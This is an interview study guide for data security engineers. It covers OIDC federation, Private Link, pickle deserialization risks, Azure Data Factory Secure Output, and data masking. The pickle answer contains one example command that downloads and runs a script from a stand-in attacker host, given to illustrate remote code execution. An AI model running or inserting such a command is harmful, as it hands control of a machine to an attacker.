# 🎓 Interview Guide 02: Mid-Level Data Security Engineer

## Core Competency Checklist:
- [ ] OIDC Workload Identity Federation vs Static Service Principal Keys
- [ ] Private Endpoints and Private Link networking
- [ ] Dynamic Data Masking (DDM) & Row-Level Security (RLS) implementation
- [ ] Azure Data Factory Managed Identity & Secure Input/Output
- [ ] Insecure deserialization risks with Python `pickle`

---

### Question 1: How does OIDC Workload Identity Federation eliminate static secrets in CI/CD pipelines?
**Answer**:
1. When a CI/CD job runs (e.g. GitHub Actions), it requests a cryptographically signed JSON Web Token (JWT) from GitHub's internal token service.
2. The JWT contains identity claims: repository name (`sub: repo:org/repo:ref:refs/heads/main`), job workflow path, and intended audience (`aud`).
3. The runner sends this JWT to the cloud identity provider (Microsoft Entra ID or AWS STS).
4. The cloud provider validates the signature against GitHub's public JWKS endpoint and verifies that the repository/branch claims match a pre-configured federated trust relationship.
5. If valid, the cloud provider exchanges the JWT for an ephemeral, short-lived (15–60 minute) access token with specific cloud RBAC roles.
- *Outcome*: Zero long-lived client secrets or access keys are ever stored in GitHub Secrets, completely eliminating the risk of leaked permanent master credentials.

---

### Question 2: Explain how Private Endpoints and Private Link protect a cloud data lake from data exfiltration.
**Answer**:
- Without Private Endpoints, cloud storage accounts (ADLS Gen2, AWS S3) resolve to public IP addresses over the internet, relying exclusively on storage firewalls and IAM policies.
- With **Private Link**:
  - A private network interface (NIC) with a private IP address (`10.100.2.15`) is injected directly into your private Virtual Network (VNet/VPC).
  - Compute clusters communicate with storage over the cloud provider's dedicated physical fiber backbone.
  - Public network access is completely disabled (`publicNetworkAccess = "Disabled"`).
  - Even if an attacker steals an authorized cloud credential, they cannot read or exfiltrate data from their own computer because the storage account completely drops all traffic originating outside the corporate private VNet.

---

### Question 3: Why is Python's `pickle` library considered unsafe for serializing data between pipeline stages?
**Answer**:
- `pickle` is not a passive data serialization format (like JSON or Protocol Buffers); it is an **executable bytecode machine**.
- During deserialization via `pickle.loads()`, the interpreter executes `__reduce__()` methods, which can call arbitrary Python functions and shell commands (e.g. `os.system("curl attacker.com | sh")`).
- If an attacker injects a malicious payload into a message queue (Kafka, Celery) or storage bucket read by an unpickling worker, they achieve instantaneous **Remote Code Execution (RCE)** with the privileges of that worker process.
- *Remediation*: Use structured, schema-enforced formats: Pydantic v2 JSON parsing, Apache Arrow, or Protocol Buffers.

---

### Question 4: How does Azure Data Factory's "Secure Output" feature prevent sensitive credential exposure?
**Answer**:
- When an ADF pipeline activity (such as a Web activity calling an OAuth token endpoint or a Lookup activity fetching a secret from Key Vault) completes, its entire output JSON payload is recorded in the pipeline run execution history and forwarded to Azure Monitor Log Analytics.
- Any user with `Reader` permissions on the ADF workspace can inspect the activity outputs and view the plaintext access token or connection string.
- Enabling **Secure Output** replaces the activity's result payload with `******` in all execution history logs, diagnostic workspaces, and webhook notifications, ensuring secrets exist strictly in volatile memory during pipeline execution.

---

### Question 5: How does Dynamic Data Masking (DDM) differ from physical data tokenization?
**Answer**:
- **Dynamic Data Masking (DDM)**: The underlying data remains in plaintext on disk; the database or lakehouse query engine intercepts the query and dynamically applies a masking scalar expression (e.g. `mask_ssn()`) based on the querying user's group membership.
- **Physical Data Tokenization**: The plaintext data is physically replaced with a surrogate non-sensitive token (e.g. HMAC hash or random UUID) **before** it is written to storage. The sensitive plaintext is isolated in a separate, encrypted token vault.
- *Trade-off*: DDM is easier to manage and preserves schema definitions, but any user with root storage access or raw file read permissions can bypass the database engine and read the plaintext directly from disk. Tokenization protects data at the physical storage layer.
